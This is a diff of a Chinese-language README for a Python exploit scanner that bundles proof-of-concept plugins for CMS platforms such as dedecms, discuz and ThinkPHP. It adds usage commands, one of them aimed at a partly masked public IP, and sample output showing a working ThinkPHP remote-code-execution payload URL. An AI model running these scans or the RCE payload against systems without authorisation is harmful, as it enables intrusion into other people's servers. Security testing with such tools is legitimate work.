@@ -1,4 +1,4 @@
-# cms_poc_exp(新增支持Pocsuite3插件)
+# cms_poc_exp (扫描版本、兼容pocsuite3插件调用)
 ![](https://img.shields.io/badge/program-Python3-blue.svg)
 ___
 
@@ -6,15 +6,28 @@ ___
 > 个人精力有限,故公开此项目让感兴趣的人一起搜集插件为自己/作者扫描器提供强力的驱动
 > 如果感兴趣为本项目提供支持,可以联系本人QQ2563152103
 
-
-+ 项目说明
+## 项目说明
   - ~~本项目插件现已支持Python3 不再兼容Python2,故若要使用 [ShellFrameworkd](https://github.com/1oid/Shell-Frameworkd)
   进行批量扫描,请自行修改插件支持Python2~~
   - ~~[ShellFrameworkd](https://github.com/1oid/Shell-Frameworkd)批量扫描将会再之后修改为支持Python3~~
   - `ShellFrameworkd`已更名为[PocBatch-M](https://github.com/1oid/PocBatch-M)并支持了Python3
-  - `扫描器版本` [访问扫描器版本](https://github.com/1oid/cms_poc_exp/tree/dev)
-  - 20201116 新增pocsuite支持，更新一部分插件
-+ 现有的cms插件
+  - 更新pocsuite3插件调用 20211116
+  - 更新算法，新增颜色 20220301
+
+## 使用说明
+`python3 scan.py -u "http://43.*.*.*" -m dedecms`
+```
+➜  cms_poc_exp_dev git:(dev) ✗ python3 newscan.py -u "http://localhost:8080" -m thinkphp
+[INFO] loaded exploits folder 31
+[INFO] loaded 4 plugins for thinkphp
+[NOT] check thinkphp_5_0_to_23_rce_captcha_poc2 not vulnerability
+[NOT] check thinkphp_5_0_to_23_rce_captcha not vulnerability
+[FIND] [ThinkphpRCE] http://localhost:8080?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
+[NOT] check thinkphp_5_0_to_20_rce_captcha not vulnerability
+```
+
+
+## 现有的cms插件
   - [dedecms](https://github.com/1oid/cms_poc_exp/tree/master/dedecms)
   - [discuz](https://github.com/1oid/cms_poc_exp/tree/master/discuz)
   - [emobile](https://github.com/1oid/cms_poc_exp/tree/master/emobile)
@@ -33,7 +46,7 @@ ___
   - [ecshop](https://github.com/1oid/cms_poc_exp/tree/master/ecshop)
   - [74cms](https://github.com/1oid/cms_poc_exp/tree/master/74cms)
 
-+ 插件编写格式,
+## 插件编写格式,
 ```python
 class Exploit:
 
